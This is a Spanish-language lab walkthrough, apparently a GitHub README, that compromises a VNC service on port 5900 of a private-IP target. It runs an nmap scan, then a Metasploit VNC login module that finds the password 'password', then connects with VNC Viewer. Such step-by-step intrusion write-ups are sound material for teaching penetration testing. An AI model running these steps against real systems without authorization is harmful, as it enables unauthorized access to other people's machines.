# Vulneración mediante el servicio VNC

No podemos iniciar a trabajar sin saber que tenemos alcance, por eso realizaremos un análisis de sus puertos y de los servicios que están disponibles.  
Para esto nos apoyaremos de la herramienta `nmap` con el siguiente comando:

```bash
nmap -sV 192.168.222.131 
```

![image](https://github.com/user-attachments/assets/08d5d404-3bf6-40b6-aaba-69b70e00629e)

Se visualiza que el puerto 5900 ofrece un servicio de VNC. Para esto, realizamos una búsqueda, pero filtrada, ya que si solo usamos `search vnc` obtendremos miles de resultados. Como nuestro objetivo principal es poder ingresar a la máquina, filtraremos por la palabra “login”.

![image](https://github.com/user-attachments/assets/07d8569e-aa57-42dd-aada-f7509bf6835e)

Usaremos el primer resultado que nos aparece ya que es compatible con nuestra máquina, haciendo uso del comando:

```bash
use 0
```

![image](https://github.com/user-attachments/assets/7cfb3923-102d-47ad-a092-e818c4955765)

Para poder visualizar las opciones y requerimientos que necesita este script usaremos:

```bash
show options
```

![image](https://github.com/user-attachments/assets/0b12282f-5e9e-455c-8033-b63aded4dff2)

Denotamos que nos hace falta la dirección IP de la máquina objetivo. En mi caso, sería la IP `192.168.222.131`. El comando para añadirlo sería:

```bash
set RHOST 192.168.222.131
```

![image](https://github.com/user-attachments/assets/e4606faf-6cd2-4540-96b6-086e6b4a09bf)

Con esto, pasamos a ejecutar nuestro exploit con el comando `run` o `exploit`:

```bash
run
```

![image](https://github.com/user-attachments/assets/24d6f244-f295-42a3-a6dd-62ff458f0b43)

Con esto el exploit nos indica que la contraseña para realizar un login mediante el puerto 5900 sería:

```
password
```

Para poder ingresar de manera gráfica nos apoyaremos en la herramienta **VNCVIEWER**.

![image](https://github.com/user-attachments/assets/4af8b82c-9aa5-4de7-891b-f392b0349e7b)
